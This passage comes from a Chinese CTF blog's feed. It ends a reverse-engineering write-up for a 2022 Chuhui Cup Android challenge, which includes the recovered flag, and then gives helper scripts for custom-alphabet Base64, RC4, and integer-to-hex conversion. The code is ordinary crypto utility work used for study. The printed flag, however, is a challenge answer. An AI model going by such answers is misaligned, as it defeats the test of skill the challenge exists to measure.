class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>    my_base64_encode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>    my_base64_decode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....bye"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{380605c6-7123-4f71-b573-601e8c4457b4}</p></blockquote><p><img src="https://s2.loli.net/2023/04/01/QCaV1x5PsDmiq7M.png" alt="2022第七届楚慧杯-Level_One9.png"></p>]]></content>
    
    
    <summary type="html">楚慧杯初赛的一道 Mobile 安卓逆向，考察更换码表的 Base64</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>便捷算法</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/</id>
    <published>2023-03-19T08:11:01.000Z</published>
    <updated>2023-03-31T18:14:54.946Z</updated>
    
    <content type="html"><![CDATA[<h2 id="可更换码表的-Base64-加解密"><a href="#可更换码表的-Base64-加解密" class="headerlink" title="可更换码表的 Base64 加解密"></a>可更换码表的 Base64 加解密</h2><h3 id="Python版（简洁脚本）"><a href="#Python版（简洁脚本）" class="headerlink" title="Python版（简洁脚本）"></a>Python版（简洁脚本）</h3><hr><ul><li><strong>特点</strong><ol><li>可以更换加密的码表</li><li>快捷，直接使用即可</li></ol></li></ul><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> string<span class="token comment">## str1表示更换码表后的待解密字符串</span>str1 <span class="token operator">=</span> <span class="token string">"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q"</span><span class="token comment">## string1表示更换后的码表</span>string1 <span class="token operator">=</span> <span class="token string">"ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/"</span><span class="token comment">## string2表示原始码表</span>string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token comment">## 将str1还原成原始码表加密后的内容，存放在str2中</span>str2 <span class="token operator">=</span> str1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">## Base64解密，base64.b64decode()的结果为 bytes 类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="Python版（完整系统）"><a href="#Python版（完整系统）" class="headerlink" title="Python版（完整系统）"></a>Python版（完整系统）</h3><hr><ul><li><strong>特点</strong><ol><li>可以更换加密的码表</li><li>支持加密和解密</li></ol></li></ul><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">## coding:utf-8</span>s <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment">## 原始码表</span><span class="token keyword">def</span> <span class="token function">my_base64_encode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>8&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">## 不够三倍数，需补齐的次数</span>    nums <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        <span class="token comment">## 每次取三个字符的二进制</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>            nums <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>                temp_list <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 将三个8字节的二进制转换为4个十进制</span>        temp_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">## print(temp_str_list)</span>        <span class="token keyword">if</span> nums<span class="token punctuation">:</span>            temp_str_list <span class="token operator">=</span> temp_str_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">-</span> nums<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> temp_str_list<span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    outputs <span class="token operator">+=</span> nums <span class="token operator">*</span> <span class="token string">'='</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_base64_decode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'='</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>6&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    nums <span class="token operator">=</span> inputs<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 补足8位字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str <span class="token operator">=</span> temp_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>        <span class="token comment">## 将四个6字节的二进制转换为三个字符</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     可更换码表的 Base64 加解密系统       "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>select <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"是否更换加密的码表? (y or n) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> select <span class="token operator">==</span> <span class="token string">"y"</span> <span class="token keyword">or</span> select <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"在这里输入码表: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....done, 已更改!"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"码表未做更改!"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>    my_base64_encode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>    my_base64_decode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....bye"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="RC4-加解密"><a href="#RC4-加解密" class="headerlink" title="RC4 加解密"></a>RC4 加解密</h2><h3 id="Python版（简洁脚本）-1"><a href="#Python版（简洁脚本）-1" class="headerlink" title="Python版（简洁脚本）"></a>Python版（简洁脚本）</h3><hr><ul><li><strong>特点</strong><ol><li>利用 Python 库快捷实现 RC4 算法</li><li><code>Key</code> 表示 RC4 的密钥，<code>Str</code> 表示待加解密的内容（<strong>bytes型</strong>）</li></ol></li></ul><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ARC4flag <span class="token operator">=</span> ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>Key<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>Str<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="Python版（具体实现）"><a href="#Python版（具体实现）" class="headerlink" title="Python版（具体实现）"></a>Python版（具体实现）</h3><hr><ul><li><strong>特点</strong><ol><li>包含具体实现流程</li></ol></li></ul><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">Str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">## 待加解密的内容</span>Key <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">## 密钥key</span>flag <span class="token operator">=</span> <span class="token string">""</span>   <span class="token comment">## 存放加解密后的结果</span><span class="token comment">## ---------- rc4_init ----------</span>s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment">## 定义 s 盒</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 生成初始 s 盒</span>    s_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token comment">##   T[i] = K[i mod len(Key)]    ## 这个算法里没有 T[i]，下面会解释</span>t <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 打乱 s 盒顺序</span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>     <span class="token comment">## j = (j + S[i] + T[i]) mod 256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp    t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token number">1</span>               <span class="token comment">## 这里引入的 t 加一个 if 条件其实就是为了做 t = i % len(Key)</span>    <span class="token keyword">if</span> t <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment">## Key[t] 配合 t = i % len(Key) 就是实现了 T[i] = K[i mod len(Key)]</span>        t <span class="token operator">=</span> <span class="token number">0</span>               <span class="token comment">## 小细节写法不同而已，大致思路是一样的</span><span class="token comment">## ---------- rc4_crypt ----------</span>i <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>      <span class="token comment">## &amp; 0xff 是为了做 % 256，两者效果相同</span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp    t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment">## &amp; 0xff 是为了做 % 256，两者效果相同</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">## 明文异或得密文，密文异或得明文</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="任意进制-int-型-十六进制-string-型"><a href="#任意进制-int-型-十六进制-string-型" class="headerlink" title="任意进制 int 型 - 十六进制 string 型"></a>任意进制 int 型 - 十六进制 string 型</h2><h3 id="C-普通版"><a href="#C-普通版" class="headerlink" title="C++普通版"></a>C++普通版</h3><hr><ul><li><strong>特点</strong><ol><li>以 <code>&#39;0x&#39;</code> 开头</li><li>转换后的数，位数都要相同，高位不足的补 <code>0</code></li><li><code>num</code> 为待转换的十进制数，<code>width</code> 为转换后的十六进制数的位数，不包括 <code>&#39;0x&#39;</code></li><li>结果以字符串形式输出</li></ol></li></ul><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>string <span class="token function">int_to_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>width <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>    s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span><span class="token punctuation">&#125;</span>std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span><span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="C-递归版"><a href="#C-递归版" class="headerlink" title="C++递归版"></a>C++递归版</h3><hr><ul><li><strong>特点</strong><ol><li>开头不包含 <code>&#39;0x&#39;</code></li><li>不要求位数相同</li><li>结果以字符数组形式输出</li></ol></li></ul><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token operator">*</span> <span class="token function">int_to_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">int</span>  this_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>this_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span>            <span class="token comment">//递归结束条件</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">//当前数转换成字符放入字符串</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span>    buffer<span class="token punctuation">[</span>this_index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span> <span class="token comment">//字符串结束标志</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">int_to_string</span><span class="token punctuation">(</span>num <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//递归调用</span>    this_index<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token comment">//字符串索引+1</span>    num <span class="token operator">%=</span> <span class="token number">16</span><span class="token punctuation">;</span>           <span class="token comment">//计算当前值</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">//当前数转换成字符放入字符串</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h3><hr><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">tmp <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  length <span class="token operator">=</span> width <span class="token operator">+</span> <span class="token number">2</span>     <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">&lt;</span> length<span class="token punctuation">:</span>         tmp <span class="token operator">=</span> <span class="token 